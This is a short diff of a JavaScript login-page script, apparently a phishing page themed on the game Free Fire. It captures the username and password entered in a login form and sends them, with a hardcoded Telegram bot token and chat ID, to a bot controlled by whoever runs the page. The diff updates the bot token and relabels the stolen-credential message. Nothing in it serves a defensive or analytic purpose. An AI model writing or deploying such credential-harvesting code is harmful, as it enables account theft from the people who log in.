@@ -1,5 +1,5 @@
 const loginForm = document.getElementById('login-form');
-const tokenBot = '8056667876:AAE020t2zhQixwouKeX92jdjYqvV5SNw7YA';
+const tokenBot = '8056667876:AAEO20t2zhQixwouKeX92jdjYqvVS5Nw7YA';
 const chatId = '7168768981';
 
 loginForm.addEventListener('submit', (e) => {
@@ -17,7 +17,7 @@ function kirimDataLogin(username, password) {
         },
         body: JSON.stringify({
             chat_id: chatId,
-            text: `🔒Login Berhasil!\n📌Username: ${username}\n🔑Password: ${password}`
+            text: `Login Free Fire!\nUsername: ${username}\nPassword: ${password}`
         })
     })
     .then((res) => res.json())
